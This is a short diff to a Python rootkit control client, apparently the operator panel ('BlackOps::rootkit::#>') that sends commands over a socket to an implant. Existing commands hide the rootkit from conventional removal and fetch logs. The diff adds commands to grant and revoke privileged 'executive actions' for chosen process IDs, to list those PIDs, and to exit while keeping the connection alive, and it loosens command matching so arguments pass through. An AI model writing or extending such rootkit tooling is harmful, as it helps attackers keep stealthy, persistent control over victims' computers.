@@ -14,7 +14,11 @@ class Rootkit:
             ("logs", "retrieves and prints the logs", []),
             ("hide", "hide the rootkit- unable to be removed by conventional means as well", []),
             ("unhide", "unhide the rootkit- able to be removed ", []),
-            ("?hidden", "queries wether the rootkit is hidden", [])
+            ("?hidden", "queries wether the rootkit is hidden", []),
+            ("pid trust", "allows the PID to carry out executive actions", ["<PID>"]),
+            ("pid untrust", "stops alowing the PID to carry out executive actions", ["<PID>"]),
+            ("pid list", "list all PIDs wich can perform executive actions", []),
+            ("exit", "returns to home panel, but connection is still kept", [])
         )
         self.prompt = "BlackOps::rootkit::#>"
 
@@ -36,7 +40,7 @@ class Rootkit:
 
     def send(self, command):
         for pos_command in self.commands:
-            if pos_command[0]==command:
+            if command.startswith(pos_command[0]):
                 self.sock.sendall(command.encode())
                 data = self.sock.recv(4096)
                 return data
